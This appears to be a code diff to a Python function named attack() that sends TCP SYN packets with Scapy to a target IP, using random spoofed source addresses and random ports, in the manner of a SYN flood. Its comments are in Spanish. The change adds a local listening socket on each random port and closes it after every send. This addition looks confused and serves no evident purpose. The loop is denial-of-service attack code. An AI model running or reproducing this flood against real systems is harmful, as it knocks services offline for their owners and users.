@@ -44,6 +44,11 @@ def attack():
                 src_port = random.randint(1024, 65535)
                 target_port = random.randint(1, 65535)
 
+                # Abrimos el puerto en nuestro ordenador
+                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                server.bind(("0.0.0.0", target_port))
+                server.listen(5)
+
                 # Crear paquete TCP con flag SYN
                 ip_packet = IP(src=src_ip, dst=target_ip)
                 tcp_packet = TCP(sport=src_port, dport=target_port, flags="S")
@@ -51,6 +56,8 @@ def attack():
 
                 # Enviar el paquete
                 send(packet, verbose=False)
+                server.close()
+                
                 #print(f"Paquete TCP SYN enviado a {target_ip}:{target_port} desde {src_ip}:{src_port}")
                 packet_count += 1
                 """
